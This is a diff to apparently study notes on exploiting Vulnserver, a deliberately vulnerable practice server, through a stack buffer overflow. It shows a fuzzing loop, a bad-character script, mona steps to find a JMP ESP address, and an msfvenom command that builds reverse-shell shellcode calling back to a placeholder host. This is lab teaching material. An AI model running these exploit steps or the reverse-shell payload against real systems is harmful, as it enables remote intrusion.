@@ -3904,7 +3904,6 @@ while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('<IP Vulnserver>', <port vulnserver>))
         s.send(('TRUN /.:/' + buffer).encode())
-        
         s.close()
         sleep(1)
         buffer += "A" * 100
@@ -3961,6 +3960,14 @@ while True:
 
 #### <ins>Finding bad characters</ins>
 
+You can generate a string of bad chars with the following python script
+```Python
+for x in range(1, 256):
+  print("\\x" + "{:02x}".format(x), end='')
+print()
+```
+
+The following python script is used to find bad chars
 ```python
 #!/usr/bin/python3
 import sys, socket
@@ -4013,12 +4020,13 @@ nasm > JMP ESP
 On Immunity, using mona, type
 1. `!mona modules` to get the module to use, one with no memory protection for vulneserver. In this case, `essfunc.dll`.
 2. `!mona jmp -r ESP -m "essfunc.dll"` to find the jump address
-3. See "[+] Results:"
+3. See the entries in `[+] Results:`
 
 #### <ins>Generating Shellcode</ins>
 
 1. Copy the result from `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
    - Always note the payload size
+   - `-b` is for the badchars identified
 2. See the following script
    ```python
    #!/usr/bin/python3
